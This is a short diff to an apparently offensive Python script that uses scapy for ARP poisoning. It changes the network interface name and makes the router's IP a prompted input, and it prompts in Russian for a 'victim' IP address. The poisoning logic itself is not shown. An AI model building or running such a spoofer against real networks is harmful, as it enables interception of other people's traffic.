@@ -2,7 +2,7 @@ import time
 import random
 
 import scapy.all as scapy
-scapy.conf.iface = "wlan0"
+scapy.conf.iface = "Intel(R) Wi-Fi 6E AX211 160MHz"
 
 
 def poison(target, router, targetMAC):
@@ -11,7 +11,7 @@ def poison(target, router, targetMAC):
 
 FAKE_MAC = "00:00:00:00:00:00"
 target = input('Введите ip адрес жертвы (пример: X.X.X.X): ')
-router = scapy.conf.route.route("0.0.0.0")[2]
+router = input("Введите ip роутера: ")
 
 
 
